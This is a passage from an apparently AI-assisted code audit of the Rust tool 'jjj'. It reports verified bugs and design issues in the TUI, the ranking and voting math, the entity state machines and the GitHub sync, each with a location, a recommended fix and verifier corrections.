- **Verifier correction:** Real consequences are narrower than stated: (1) problem stays Open so it renders White instead of Yellow in the tree/detail (ui.rs:57-65), and (2) the persisted solution_ids array is left empty/stale on disk (it is NOT auto-derived, confirmed via serde attrs in problem.rs:40-41). The finding's claim that is_open()-based logic in next_actions/rank/status mis-treats the problem is FALSE — is_open() matches both Open and InProgress, and next_actions keys off s.is_active(), not problem status. Because the user-visible impact is a wrong status color plus a stale internal array (no triage/ranking misbehavior), 'high' is overstated; medium is appropriate. The proposed fix (route both CLI and TUI through a shared domain::create_solution that loads the problem, add_solution, attempts Open->InProgress, and re-saves) is a genuine improvement and consistent with the existing src/domain.rs pattern (which already hosts approve/submit/withdraw/solve helpers).

### 🟡 `MEDIUM` TUI problem creation under a milestone does not register in milestone.problem_ids

**Category** correctness · **Effort** small · **Verdict** 🟡 **partial** (high conf)

- **Location:** `src/tui/app/actions.rs:25-51 (create_problem) vs src/commands/problem.rs:166-173`
- **Problem:** When creating a problem under a milestone, the CLI sets `problem.milestone_id` AND appends the id to the milestone's `problem_ids` (loading and re-saving the milestone). The TUI's `create_problem` only sets `problem.milestone_id`. `milestone.problem_ids` is consumed by `jjj milestone show`/`status` (milestone.rs:159,203,374), `jjj rank` (rank.rs:70), and the DB index (db/entities.rs:424). So a problem created in the TUI under a milestone is invisible to milestone completion counts and rank initialization until something else rewrites the milestone. Note the TUI's own `move_problem_to_milestone` (actions.rs:1333-1336) DOES maintain `problem_ids`, making this an internal inconsistency.
- **Recommendation:** In `create_problem`, when `milestone_id` is Some, load the milestone, `add_problem(&id)`, and save it inside the same with_metadata transaction (mirroring `move_problem_to_milestone`). Better: consolidate into a shared domain create function.
- **Verifier correction:** Bug and fix are valid; keep medium. Correction: remove `jjj rank` (rank.rs:70) from the list of broken consumers — rank.rs:55-82 resolves milestone membership primarily via each problem's own `milestone_id` (line 62), so TUI-created problems ARE ranked correctly; `problem_ids` there is only a fallback. The accurate impact statement is: milestone show/status/list progress counts and the milestone's denormalized DB `problem_ids` column miss TUI-created problems, and delete_milestone would also fail to orphan them. Recommend the proposed fix or, better, a shared domain create-problem function so CLI and TUI cannot drift again.

### 🟡 `MEDIUM` Detail-pane scroll is unbounded; G and over-scroll blank the pane

**Category** bug · **Effort** medium · **Verdict** ✅ **confirmed** (high conf)

- **Location:** `src/tui/app/navigation.rs:215-237; src/tui/ui.rs:452-455`
- **Problem:** `scroll_detail_down`/`page_detail_down` use `saturating_add` with no clamp to content length, and `detail_scroll_to_bottom` sets `detail_scroll = u16::MAX`. The renderer does `lines.into_iter().skip(detail_scroll as usize)`, so once the offset exceeds the line count the detail pane renders completely empty. Pressing `G` (advertised as 'jump to bottom') therefore ALWAYS blanks the pane rather than showing the end, and holding `j` past the end blanks it with no feedback. The user must scroll back up blindly to recover.
- **Recommendation:** Track the rendered line count (the draw fn already computes `lines`; store the last content length on the App or compute max scroll in draw and pass it to a clamp). Clamp `detail_scroll` to `line_count.saturating_sub(viewport_rows)` in the scroll handlers, and implement `detail_scroll_to_bottom` as setting that clamped max rather than u16::MAX.

### 🟡 `MEDIUM` actions.rs (1930 LOC) is a god-object mixing five unrelated responsibilities

**Category** design · **Effort** medium · **Verdict** ✅ **confirmed** (high conf)

- **Location:** `src/tui/app/actions.rs (entire file)`
- **Problem:** actions.rs bundles: (1) entity CRUD creation (create_problem/solution/critique/milestone, update_title/tags, batch tag/delete/move, lines ~25-1365); (2) lifecycle transitions (handle_action_a/u/d/s/o/v, dispatch_domain wrappers, ~514-960); (3) the entire ranking subsystem — tier drill, tier assign, votes, bubble, undo, reorder_by_votes, ensure_ordering (~1367-1916); and (4) cache/refresh plumbing (refresh_data, rebuild_cache, ~904-952). These have distinct change reasons and distinct collaborators. The ranking code in particular (~550 lines) is self-contained (operates on personal_orderings + ordering::save) and is the natural seam.
- **Recommendation:** Split into `app/crud.rs` (create/update/delete/move/tags), `app/transitions.rs` (handle_action_* + dispatch_domain), and `app/ranking.rs` (tier drill, votes, bubble, undo, ensure_ordering, reorder_by_votes). refresh_data/rebuild_cache can stay in mod.rs or a small `app/cache.rs`. Each becomes an `impl App` block in its own file (the pattern already used by navigation/editor/related).

### 🔵 `LOW` Voting (+/-) does not switch to personal-ordering view, unlike tier assignment

**Category** correctness · **Effort** trivial · **Verdict** — _(low/nit, not independently verified)_

- **Location:** `src/tui/app/actions.rs:1676-1752 (adjust_vote) vs 1567-1569 (assign_tier)`
- **Problem:** `assign_tier` flips `show_personal_ordering = true` before mutating so the reorder is immediately visible. `adjust_vote` (and `bubble_up`/`bubble_down`) do not. If the user is in global view (r toggled) and presses `+`, the vote is recorded and persisted and `move_cursor_to_problem` runs against the global tree, but the vote arrows and the three-zone reordering are computed on the personal ordering that isn't being displayed — so the visible tree doesn't change and the flash '+1 (budget x/y)' appears with no corresponding UI movement. Not data loss (the vote aggregates correctly), but inconsistent and confusing.
- **Recommendation:** Either flip to personal view in adjust_vote/bubble_up/bubble_down for consistency with assign_tier, or (cleaner) factor a `enter_personal_view_for_reorder()` helper called by all four ranking mutators.

### 🔵 `LOW` Milestone context hint advertises a non-existent [D] key for cancel

**Category** docs · **Effort** trivial · **Verdict** — _(low/nit, not independently verified)_

- **Location:** `src/tui/app/navigation.rs:404; binding in src/tui/app/mod.rs:505`
- **Problem:** The milestone context-hint footer text says '[D] cancel', but there is no uppercase-D key binding; milestone cancel is handled by lowercase `d` (`KeyCode::Char('d') => handle_action_d`). The help overlay (ui.rs:751) correctly shows lowercase `d`. So the inline hint contradicts both the actual binding and the help overlay, and pressing Shift+D does nothing.
- **Recommendation:** Change `[D] cancel` to `[d] cancel` in the milestone context hint.

### 🔵 `LOW` Tier-drill thirds (floor div) diverge from rank tier coloring (ceil div)

**Category** correctness · **Effort** small · **Verdict** — _(low/nit, not independently verified)_

- **Location:** `src/tui/app/actions.rs:1415 (range_size/3) vs src/tui/ui.rs:107-119 (tier_color_for_rank div_ceil)`
- **Problem:** `tier_drill_in` computes tier boundaries with floor division: `third = range_size / 3`, top=[0,third). `tier_color_for_rank` colors rank numbers with ceil division: `third = total.div_ceil(3)`, green if `rank <= third`. For totals not divisible by 3 the two disagree about which items are 'top tier'. E.g. with 5 items: drill 'Top' tier = positions [0,1) (1 item), but the green-colored 'top tier' ranks are 1..=2 (div_ceil(5,3)=2, 2 items). The visual tier (color) and the navigational tier (drill) are inconsistent, which undermines the 'drill into the tier you see' mental model.
- **Recommendation:** Use one shared tier-boundary helper (e.g. `fn tier_bounds(n) -> (top_end, mid_end)`) consumed by both the drill math and the color math so coloring and drilling always agree.

### 🔵 `LOW` TUI never reloads after external CLI edits or fetch merges; view silently goes stale

**Category** design · **Effort** small · **Verdict** — _(low/nit, not independently verified)_

- **Location:** `src/tui/app/mod.rs:386-407 (run loop); refresh_data only called after self-mutations`
- **Problem:** `refresh_data` (the only path that reloads ProjectData from storage) is invoked exclusively after the TUI's own mutations. There is no manual refresh key, no file watcher, and the 100ms poll loop only renders cached data. If another `jjj` process edits an entity, or a `jjj fetch` performs the new three-way metadata merge while the TUI is open, the TUI keeps showing stale data and a subsequent TUI edit re-saves the stale snapshot (last-writer-wins at the file level via with_metadata). Given the offline/multi-user design (and the new merge-on-fetch machinery), a way to re-sync the open TUI is a notable gap.
- **Recommendation:** Add an explicit refresh key (e.g. Ctrl+R) that calls `refresh_data()`, and consider a cheap mtime check on the meta dir each poll tick to auto-refresh when files change underneath the TUI. At minimum, document the staleness limitation.

### 🔵 `LOW` Batch decline/solve loops swallow per-item errors silently except solutions

**Category** correctness · **Effort** small · **Verdict** — _(low/nit, not independently verified)_

- **Location:** `src/tui/app/actions.rs:612-708 (handle_action_d batch), 727-795 (handle_action_s batch)`
- **Problem:** In the batch decline path, critique dismiss, problem dissolve, and milestone cancel use `if X.is_ok()` / `let Ok(...) =` and silently skip failures (no count, no flash, no eprintln) — only the solution-withdraw branch reports via eprintln. handle_action_s collects errors into a count but only surfaces '{n} errors' without details. A user batch-declining 10 items where 3 fail just sees '7 dissolved' with no indication the other 3 silently failed. Inconsistent error surfacing across branches.
- **Recommendation:** Accumulate failures in all branches (like handle_action_s does) and include a '{n} failed' segment in the flash, consistent with batch_delete (actions.rs:1127-1131) which already does this.


---

## 8. Ranking & voting math

**Dimension summary:** The core ranking math (three-zone personal ordering, harmonic aggregation, quadratic vote cost, tie-breaking by ID) is internally consistent, well-tested, and deterministic in its sort/tie-break logic. However there is one critical correctness/data-loss defect: per-user ranking JSON files are NEVER pushed or fetched or merged — the whole `rankings/` tree is local-only, so "global" Borda aggregation across users can never actually see other users' votes in the distributed model the project is built around. Secondary issues: an integer-overflow in `vote_cost` that silently zeroes (or panics in debug) the QV budget for hand-edited/merged files, three divergent definitions of `problem_count` feeding the QV budget, the documented "Borda count" being implemented as harmonic (N/rank) which is a different and rank-length-biased aggregation, and non-associative f64 score accumulation over HashMap iteration order that can perturb near-ties. None of these are caught by the existing tests, which only exercise single-process in-memory scenarios.


### 🔴 `CRITICAL` Ranking/vote JSON files are never synced (not pushed, not fetched, not merged) — global ranking is impossible across users

**Category** bug · **Effort** medium · **Verdict** ✅ **confirmed** (high conf) · **verifier re-rated → `high`**

- **Location:** `src/commands/push.rs:107-141, src/commands/fetch.rs:98-147, src/storage/mod.rs:45`
- **Problem:** The entire premise of the global ranking (Borda + QV aggregation across all users in `rankings/{milestone}/{user}.json`) requires those per-user files to be shared between collaborators. They never are. `sync_meta_to_bookmark` in push.rs copies only `problems`, `solutions`, `critiques`, `milestones` dirs plus `config.toml` and `events.jsonl` (lines 107-141); `rankings/` is omitted, so it is never committed to the jjj bookmark and never pushed. Symmetrically, fetch.rs iterates only `["problems","solutions","critiques","milestones"]` (line 98) plus config/events, so remote ranking files are never pulled. The new three-way merge (merge.rs) is keyed off `ENTITY_DIRS` (storage/mod.rs:45) which also excludes rankings. `save_user_ordering` writes into `store.meta_path()` (the `.jj/jjj-meta` working set, actions.rs:1647/1738/1826/1869/1903), so the data exists locally but can never leave the machine. Result: `aggregate_rankings`/`compute_rankings`/`jjj rank show` always operate on a single user's local data; cross-user Borda aggregation, voter counts >1, and global ordering are all dead in practice. This is silent data isolation, not data loss of existing files, but it defeats the documented feature entirely.
- **Recommendation:** Add `rankings` to the set of directories copied in `sync_meta_to_bookmark` and reconciled in `fetch.rs`. Because these are JSON (not entity markdown), they need their own merge strategy: per-file LWW by `updated_at` is safe since each file is owned by exactly one user (the slug encodes identity), so two users editing the same `{user}.json` is rare/impossible in normal flow — a simple union of files across the tree plus per-file LWW suffices. Add an integration test that pushes from user A, fetches as user B, and asserts `load_all_orderings` returns both users.

### 🟠 `HIGH` vote_cost(i32) overflows u32 for large magnitudes — silent wrap to 0 (release) or panic (debug), bypassing the QV budget

**Category** correctness · **Effort** small · **Verdict** ✅ **confirmed** (high conf)

- **Location:** `src/ranking/borda.rs:11-13, src/tui/app/actions.rs:1705-1717`
- **Problem:** `vote_cost(votes) = votes.unsigned_abs() * votes.unsigned_abs()` multiplies two u32 values with no overflow guard. For |v| >= 65536 the u32 product overflows. Verified empirically: in release mode `vote_cost(65536) = 0` and `vote_cost(46341) = 2147488281` (wrapped); in debug mode the multiply panics. The interactive path (adjust_vote, actions.rs:1705) caps votes via the budget so a user can't normally reach |v|>=46341 through the UI. BUT `load_user_ordering`/`load_all_orderings`/`aggregate_rankings` apply NO validation, and the votes HashMap is `i32` deserialized directly from JSON. A hand-edited `rankings/*.json`, a corrupted file, or (once sync is fixed) a merged file can carry a huge magnitude. cost=0 means `total_vote_cost <= budget` passes and the QV contribution `v * |v|` (also computed in f64 at borda.rs:61) injects an enormous score, silently dominating the ranking. In a debug build, `jjj rank show` or the TUI ranking compute panics outright.
- **Recommendation:** Compute cost in u64 (or saturating): `let a = votes.unsigned_abs() as u64; (a*a).min(u32::MAX as u64) as u32` and/or clamp vote magnitude on load to a sane bound (e.g. |v| <= isqrt(budget)+1). Also clamp/validate votes in `load_user_ordering`/`load_all_orderings` so a bad file can't poison aggregation or panic the TUI.

### 🟡 `MEDIUM` Three divergent definitions of problem_count feed qv_budget — a vote accepted interactively can be silently dropped as over-budget during aggregation

**Category** correctness · **Effort** medium · **Verdict** ✅ **confirmed** (high conf)

- **Location:** `src/tui/app/actions.rs:1684-1690, src/tui/app/mod.rs:160, src/commands/rank.rs:116/188`
- **Problem:** `qv_budget(N) = max(100, 2*N)`. N is computed three different ways: (1) interactive cap in adjust_vote counts problems with `p.milestone_id == milestone_id` regardless of status and ignoring milestone.problem_ids (actions.rs:1684-1689); (2) TUI global compute uses `orderings.values().map(|o| o.order.len()).max()` (mod.rs:160); (3) `rank show` uses `open_problems_in_milestone(...).len()`, which filters to OPEN problems and also includes milestone-side `problem_ids` (rank.rs:51-81,116). When a milestone has >50 problems (so the 100 floor no longer dominates) these N values differ — e.g. many solved problems inflate definition (1) but not (3); a user whose personal `order` omits some problems shrinks definition (2). Since `aggregate_rankings` re-checks `total_vote_cost <= budget` and SILENTLY skips ALL of a user's QV votes when over (borda.rs:57-58), a vote allocation the TUI accepted under a larger budget can be wholesale discarded when displayed by `rank show` or the global compute under a smaller budget. The drop is all-or-nothing and silent, so the user's expressed preference vanishes with no feedback.
- **Recommendation:** Define problem_count once (a single helper, e.g. open problems in the milestone via both problem-side and milestone-side refs) and use it for the interactive cap, the TUI compute, and rank show. At minimum make the aggregation budget match the cap used when votes were entered, and consider scaling individual over-budget votes down rather than dropping the entire allocation, with a visible warning.

### 🟡 `MEDIUM` Aggregation is harmonic (N/rank), not Borda, and is biased by each user's ordering length

**Category** correctness · **Effort** medium · **Verdict** ✅ **confirmed** (high conf)

- **Location:** `src/ranking/borda.rs:31-54`
- **Problem:** The module is named `borda` and CLAUDE.md/docs state global ranking is 'Borda count + QV boost', but the implementation awards harmonic points `N/rank` where N is THAT user's ordering length (borda.rs:50-52). This is materially different from Borda (which awards N-rank). Two consequences: (a) the gap between rank 1 and rank 2 (N vs N/2) is enormous while ranks deep in the list are nearly tied — a front-loaded weighting that is a legitimate design choice but is NOT Borda and should not be documented as such; (b) because N is the individual user's list length, a user who ranks more problems contributes systematically larger point totals (rank-1 worth N=50 for a long ranker vs N=5 for a short ranker), giving prolific rankers disproportionate aggregate influence and making cross-user comparison unfair. The unit test `test_two_users_symmetric` only works because both users rank the identical 3-item set; with differing item-set sizes the asymmetry surfaces.
- **Recommendation:** Decide on one model and make code, comments, and docs agree. If front-loaded weighting is desired, normalize per user (e.g. divide each user's contribution by their list length or by sum of their points) so users contribute equal total weight regardless of how many items they ranked. If Borda is actually intended, award (N-rank) or a globally consistent N. Update CLAUDE.md accordingly.

### 🔵 `LOW` Global scores accumulated via non-associative f64 addition over HashMap iteration order — not bit-reproducible across runs

**Category** correctness · **Effort** small · **Verdict** — _(low/nit, not independently verified)_

- **Location:** `src/ranking/borda.rs:45-69`
- **Problem:** Scores are summed into a `HashMap<String,f64>` by iterating `orderings.values()` (borda.rs:45) and, within each user, `&ordering.votes` (borda.rs:59) — both HashMap iterations with no deterministic order. Floating-point addition is not associative, so the accumulated `score` for a problem can differ in its lowest bits between runs/users with different hash seeds. The final sort breaks exact ties by ID (borda.rs:82-83), but that tie-break only triggers on `partial_cmp == Equal`; two problems whose 'true' scores are equal can end up with f64 sums that differ by 1 ULP, comparing as Greater/Less instead of Equal, so the ID tie-break is bypassed and the displayed order can flip between runs. Impact is small (only affects genuine near-ties and only by one position) but it undermines the 'deterministic/reproducible global ranking' property the design claims, and the published `score` value (rounded to 1 decimal in rank.rs:148) can occasionally differ.
- **Recommendation:** Accumulate in a deterministic order: collect contributions into a Vec, sort by problem_id, then sum; or sum per-problem from a BTreeMap. Alternatively round scores to a fixed precision before the final sort so 1-ULP differences collapse to true ties and the ID tie-break governs. Add a test that aggregates the same orderings twice with shuffled insertion order and asserts identical output ordering.

### 🔵 `LOW` voter_count is only incremented for vote-only problems when the user is within budget, conflating 'voter' with 'budget-compliant voter'

**Category** design · **Effort** small · **Verdict** — _(low/nit, not independently verified)_

- **Location:** `src/ranking/borda.rs:56-67`
- **Problem:** `AggregatedRank.voter_count` is documented as 'Number of users who included this problem in their ordering' (ordering.rs:83). A problem that a user only voted on (not present in their `order` list) is counted as a voter only inside the `if cost <= budget` block (borda.rs:58-66). So if that user is over budget, their interest in the problem is invisible in voter_count even though their vote intent existed; and a problem expressed purely via votes by an over-budget user shows voter_count 0 and no score contribution at all, silently disappearing from `rank show` (which additionally filters to problems in `problem_ids`). Combined with the all-or-nothing budget skip, this makes voter_count an unreliable signal of engagement. Minor because in normal interactive use everyone is within budget (the cap enforces it), but it is a latent inconsistency once files are merged/hand-edited.
- **Recommendation:** Count a user as a voter for a problem if it appears in their order OR their votes, independent of budget compliance; track budget-skip separately if you want to surface it. Document the chosen semantics on the field.

### 🔵 `LOW` Over-budget vote allocations are dropped silently with zero user feedback in aggregation and rank show

**Category** design · **Effort** small · **Verdict** — _(low/nit, not independently verified)_

- **Location:** `src/ranking/borda.rs:56-68, src/commands/rank.rs:113-176`
- **Problem:** When a user's `total_vote_cost` exceeds budget, `aggregate_rankings` skips the entire votes map (borda.rs:57-58) with no diagnostic. `jjj rank show` (non --by-user) likewise shows no indication that a user's votes were excluded — the score simply reflects harmonic-only for that user. The per-user view (`show_by_user`) does print budget_used/budget, but a budget_used that exceeds budget is shown without flagging that those votes were dropped from the global score. Given the overflow issue (finding 2) can make `total_vote_cost` wrongly report 0, and the problem_count divergence (finding 3) can push a previously-valid allocation over budget, this silence makes the resulting ranking hard to trust or debug.
- **Recommendation:** Have `aggregate_rankings` (or a sibling) return the set of users whose QV was skipped for over-budget, and surface a warning in `rank show` and the TUI. Alternatively scale over-budget allocations down to fit rather than dropping them.


---

## 9. Models, domain & invariants

**Dimension summary:** The core entity models (Problem/Solution/Critique/Milestone) are clean, well-documented, and serde round-trips are tested (force_approved alias, tag defaults). State transitions are encoded as runtime-checked transition tables (can_transition_to/try_set_status) rather than type-level — illegal states remain representable, but the per-mutation guard is consistent for Problem/Solution/Critique. The most serious issues are not in the model structs themselves but in the hand-maintained string↔enum mappings and event plumbing around them: two duplicated parse_event_type maps silently corrupt all six GitHub event variants into ProblemCreated on DB read, milestone lifecycle events are never emitted yet the consistency checker demands them, and Problem::dissolve() bypasses its own state machine producing asymmetric enforcement. There is also a UTF-8 panic in parse_entity_reference reachable from `jjj search`. None cause silent on-disk corruption of entity files, but several cause incorrect derived data and one crashes on user input.


### 🟠 `HIGH` GitHub event types silently corrupted to ProblemCreated on DB read

**Category** correctness · **Effort** small · **Verdict** 🟡 **partial** (high conf) · **verifier re-rated → `low`**

- **Location:** `src/db/events.rs:141-166 and src/db/search.rs:462-486`
- **Corrected location:** Code is correct as cited (src/db/events.rs:141-166 and src/db/search.rs:462-486); the impact attribution to live timelines/insights/filters is wrong — those read store.list_events() (events.jsonl via serde), not the DB readers.
- **Problem:** Both `parse_event_type` functions are hand-maintained string→EventType maps that only cover 15 of the 21 EventType variants. All six GitHub variants (github_issue_created, github_issue_imported, github_issue_closed, github_pr_created, github_pr_merged, github_review_imported) fall through to the catch-all `other =>` arm and are coerced to EventType::ProblemCreated. Meanwhile insert_event (db/events.rs:22) writes `event.event_type.to_string()`, which via strum/Display correctly serializes every variant including the GitHub ones. So a GitHub event written to the DB and read back through list_events or search round-trips into a ProblemCreated event with mismatched entity classification — timelines, insights, and event filters on GitHub activity are silently wrong.
- **Recommendation:** Delete both hand-written maps and parse via the canonical encoding: `serde_json::from_value(serde_json::Value::String(s.to_string()))` or add a `FromStr`/`TryFrom<&str>` on EventType that mirrors as_str() exactly, then call it from both sites. Since as_str() and serde rename already agree, a single round-trippable source removes the drift permanently. Add a test asserting every EventType variant survives to_string()→parse.
- **Verifier correction:** Severity should be low, not high: the buggy functions have no production callers (only unit tests), so no GitHub-event corruption is actually reachable. The two readers are effectively dead code drift relative to insert_event. The fix is still worth doing as defense-in-depth before anyone consumes the DB event readers; adding a per-variant round-trip test would catch the drift permanently.

### 🟠 `HIGH` Milestone lifecycle events are never emitted but consistency checker requires them

**Category** correctness · **Effort** small · **Verdict** ✅ **confirmed** (high conf)

- **Location:** `src/commands/milestone.rs:33-113, src/tui/app/actions.rs:755-764 / 814-822, src/commands/events.rs:248-267 and 365-376`
- **Problem:** MilestoneCreated and MilestoneCompleted EventTypes exist and the `events --check` consistency validator requires them (Check 3 flags any entity with no creation event; Check 4 flags any Completed milestone with no milestone_completed event). But no code path ever emits a milestone event: create_milestone only does Milestone::new + save_milestone, and every status mutation (CLI update, TUI complete/activate batch) calls milestone.set_status + save_milestone with no Event::new/set_pending_event. Consequently every milestone is reported "has no creation event" and every Completed milestone "has no milestone_completed event", making the checker emit guaranteed false positives and eroding trust in it.
- **Recommendation:** Either emit MilestoneCreated in create_milestone and MilestoneCompleted when status transitions to Completed (mirroring problem/solution domain ops, ideally by adding milestone ops to src/domain.rs), or — if milestones are intentionally event-free — remove the milestone arms from the consistency checker (events.rs:256 and 365-376). The two halves must agree.

### 🟡 `MEDIUM` parse_entity_reference panics on multibyte UTF-8 input from `jjj search`

**Category** bug · **Effort** trivial · **Verdict** ✅ **confirmed** (high conf)

- **Location:** `src/resolve.rs:85-95 (used by src/commands/search.rs:34)`
- **Problem:** parse_entity_reference guards with `input.len() < 3` (byte length) then `input.split_at(1)`. split_at(1) panics if byte index 1 is not a char boundary, i.e. when the first character is a multibyte UTF-8 code point. It is called directly on the raw user-supplied search query in commands/search.rs:34, so `jjj search "é/x"` or `jjj search "日本語"` crashes the CLI with a panic instead of returning a clean no-match.
- **Recommendation:** Operate on chars, not byte offsets: `let mut chars = input.chars(); let type_char = chars.next()?; if chars.next()? != '/' { return None } let id = &input[type_char.len_utf8()+1..];` — or restrict the type prefix check to ASCII (`input.as_bytes().get(1) == Some(&b'/') && input.is_char_boundary(1)`). Add a test with a multibyte leading char.

### 🟡 `MEDIUM` Problem::dissolve() bypasses the state machine, making dissolve enforcement asymmetric

**Category** design · **Effort** small · **Verdict** ✅ **confirmed** (high conf)

- **Location:** `src/models/problem.rs:278-282, src/domain.rs:236-248`
- **Problem:** can_transition_to does NOT permit Solved→Dissolved (problem.rs:263-275). But Problem::dissolve() assigns status = Dissolved directly without consulting can_transition_to. domain::dissolve_problem then branches: with a reason it calls problem.dissolve(r) (unchecked, allowing Solved→Dissolved), without a reason it calls try_set_status(Dissolved) (which correctly rejects Solved→Dissolved). So `jjj problem dissolve <solved> --reason x` succeeds while `jjj problem dissolve <solved>` fails — the same logical transition is allowed or forbidden depending purely on whether an optional reason string is present. This is an invariant leak: dissolve() is a second, unguarded mutation path for the same field the state machine is supposed to govern.
- **Recommendation:** Make dissolve() validate: `self.try_set_status(ProblemStatus::Dissolved)?; self.dissolved_reason = Some(reason.into());` returning Result, or have it call set_status only after a can_transition_to check. Decide deliberately whether Solved→Dissolved is legal and encode it once in the table so both reason/no-reason paths agree.

### 🟡 `MEDIUM` events.jsonl lines silently dropped on parse failure / unknown event type (no forward-compat)

**Category** correctness · **Effort** medium · **Verdict** ✅ **confirmed** (high conf)

- **Location:** `src/storage/events.rs:26-30, src/models/event.rs:5-38`
- **Corrected location:** Primary drop site is src/storage/events.rs:29 (within the 26-30 range cited); EventType enum at src/models/event.rs:5-38; consistency-checker impact at src/commands/events.rs:248-376; merge layer that deliberately preserves unknown lines at src/storage/merge.rs:127-151.
- **Problem:** list_events parses NDJSON with `.filter_map(|l| serde_json::from_str(l).ok())`, silently discarding any line that fails to deserialize. EventType has no `#[serde(other)]` fallback, so an events.jsonl written by a newer jjj with an unknown event type (a real scenario given the offline, multi-user, push/fetch sync model) fails to deserialize and the entire event line vanishes from history. Genuine corruption also disappears with no diagnostic. Because the event log is the audit trail / source of truth for the consistency checker and timeline, dropped lines produce phantom 'missing creation/solved event' errors and incomplete timelines.
- **Recommendation:** Add `#[serde(other)] Unknown` (or a Catchall(String)) to EventType for forward-compat, and change the read loop to log (not silently drop) lines that still fail to parse, e.g. collect parse errors and surface a count. Preserving unknown lines verbatim on rewrite avoids data loss when an older client re-pushes the log.

### 🔵 `LOW` TUI/editor silently discards invalid status (and priority/severity) strings

**Category** correctness · **Effort** small · **Verdict** — _(low/nit, not independently verified)_

- **Location:** `src/tui/app/editor.rs:300-409`
- **Problem:** When applying an edited entity, status/priority/confidence/severity are parsed with `.and_then(|s| s.parse::<...>().ok())`. A typo'd status (e.g. user types 'solveed') yields None, the `if let Some(...)` is skipped, and the edit completes 'successfully' while silently leaving the old status in place. The user gets no feedback that their intended status change was rejected — distinct from try_set_status, which at least reports an invalid *transition*. This is a quiet failure across all four entity editors.
- **Recommendation:** Surface the FromStr error instead of swallowing it: parse into a Result and map_err to a flash/validation error when a status field is present but unparseable, so the user learns the value was rejected.

### 🔵 `LOW` State machine is runtime-checked, not type-encoded; statuses/Change IDs are stringly-typed

**Category** design · **Effort** medium · **Verdict** — _(low/nit, not independently verified)_

- **Location:** `src/models/problem.rs:251-275, src/models/solution.rs:183-205, src/models/solution.rs:33, src/models/critique.rs:23`
- **Problem:** Illegal states remain representable: status fields are plain enums with public pub(crate) set_status that bypasses validation (used in production milestone paths and reachable for others), and there is no compile-time guarantee a Solution is Submitted before approve(). The audit asked whether illegal transitions are unrepresentable — they are not; they are guarded only by can_transition_to at each call site. Separately, Change IDs (Solution.change_ids: Vec<String>), problem_id/solution_id foreign keys, and statuses are all bare String/enum with no newtype, so a problem_id could hold a solution UUID with no type-level objection (primitive obsession). This is acceptable for the current size but is the main lever to make illegal states unrepresentable.
- **Recommendation:** Lowest-cost improvement: introduce a ChangeId newtype (newtype wrapper over String) and EntityId newtypes for problem/solution/critique to prevent cross-assignment, and consider making set_status private to the module so all mutations route through try_set_status. A fuller fix (typestate per status) is likely overkill here; document the runtime-guard design choice if keeping it.

### 🔵 `LOW` is_hex_prefix shadows hex-like titles, defeating fuzzy resolution for words like 'facade'

**Category** correctness · **Effort** small · **Verdict** — _(low/nit, not independently verified)_

- **Location:** `src/id.rs:19-22, src/resolve.rs:41-62`
- **Problem:** is_hex_prefix returns true for any string with ≥6 hex digits composed only of hex digits/hyphens. resolve() treats such input as a UUID prefix and, if it matches no entity ID, returns ResolveResult::None WITHOUT falling through to fuzzy title search. So resolving a problem titled 'Facade pattern refactor' by typing 'facade' (6 hex chars: f,a,c,a,d,e) short-circuits to prefix matching, finds no UUID starting with 'facade', and reports not-found even though the title clearly matches. Other all-hex English words (decade, deface, ffffff-like) hit the same trap.
- **Recommendation:** When the hex-prefix branch finds zero matches, fall through to fuzzy title search instead of returning None, or only treat input as a hex prefix when it actually prefixes at least one known entity ID. The documented priority order can be preserved while still allowing title fallback on prefix miss.


---

## 10. Automation & GitHub sync

**Dimension summary:** The automation engine and GitHub sync are reasonably well-structured: the has_explicit_rule backward-compat correctly prevents the most obvious CLI double-fire (legacy auto_create_issue vs the github_issue rule both creating an issue), template-var population loads the right entities, and sync_push reconciles issue state with per-operation error isolation. However there are several real correctness gaps. The most impactful: (1) the auto_close_on_solve config option is effectively dead because the only call site is gated behind the --github-close flag; (2) importing a closed GitHub issue produces an Open problem, which then reopens the issue on the next push — a real bidirectional-reconciliation bug; (3) the legacy auto_push/auto_close hooks are wired only into CLI command handlers, so the TUI silently performs no GitHub automation; (4) built-in issue/PR creation has no partial-failure recovery — a network failure after gh succeeds but before save_problem orphans the remote object and causes a duplicate on retry; and (5) the --base flag for PR creation is silently ignored (hardcoded "main"). There is also a re-fire hazard where merge → approve_solution → solution_approved automation can re-invoke github_merge on an already-merged PR, and the GithubIssueCreated event type is defined/rendered but never emitted by the automation-driven creation path.


### 🟠 `HIGH` auto_close_on_solve config is dead — issue never auto-closes on `jjj problem solve`

**Category** bug · **Effort** small · **Verdict** ✅ **confirmed** (high conf)

- **Location:** `src/commands/problem.rs:583-595 (solve), 617-633 (dissolve); src/sync/hooks.rs:132-151`
- **Problem:** auto_close_issue() honors three triggers — force (--github-close), github.auto_close_on_solve, and github.auto_push (hooks.rs:137). But the only call site is inside `if github_close { ... }` (problem.rs:583), so it is unreachable unless the user already passed --github-close. When --github-close IS passed, force=true overrides those config checks anyway. Net effect: setting `auto_close_on_solve = true` (or relying on auto_push as a catch-all) does nothing on a plain `jjj problem solve` / `jjj problem dissolve`. The config field, its default, the status display (sync.rs:527), and the documented behavior in hooks.rs:127 all advertise functionality that never fires.
- **Recommendation:** Call auto_close_issue unconditionally after domain::solve_problem/dissolve_problem (not gated on github_close), passing force=github_close. Let the in-function guards decide whether to act based on auto_close_on_solve/auto_push. Keep the has_explicit_rule(ProblemSolved/ProblemDissolved) skip. Add a test that sets auto_close_on_solve=true with no flag and asserts the close hook runs.

### 🟠 `HIGH` Importing a closed GitHub issue yields an Open problem that reopens the issue on next push

**Category** correctness · **Effort** small · **Verdict** ✅ **confirmed** (high conf)

- **Location:** `src/sync/github/mapping.rs:8-47 (issue_to_problem); src/commands/sync.rs:816-838 (sync_push reopen)`
- **Problem:** issue_to_problem ignores the issue state entirely — every imported issue becomes ProblemStatus::Open (Problem::new default). get_issue already fetches `state` (client.rs:140) but it is dropped. `jjj github import #N` accepts any issue number, including a closed one. The newly created Open problem is then linked. On the next `jjj github push`, sync_push sees (should_be_closed=false, live_status=Closed) and calls provider.reopen_issue — silently reopening a deliberately-closed GitHub issue. This is a bidirectional-reconciliation bug that mutates remote state contrary to the user's intent.
- **Recommendation:** In issue_to_problem, read json["state"] and if Closed set the problem to Solved (or Dissolved) so it is consistent with the remote. Alternatively, refuse to import closed issues without an explicit flag. Either way, prevents the import→push round-trip from reopening the issue.

### 🟡 `MEDIUM` TUI performs no GitHub automation — legacy auto_push/auto_close hooks are CLI-only

**Category** design · **Effort** medium · **Verdict** 🟡 **partial** (high conf)

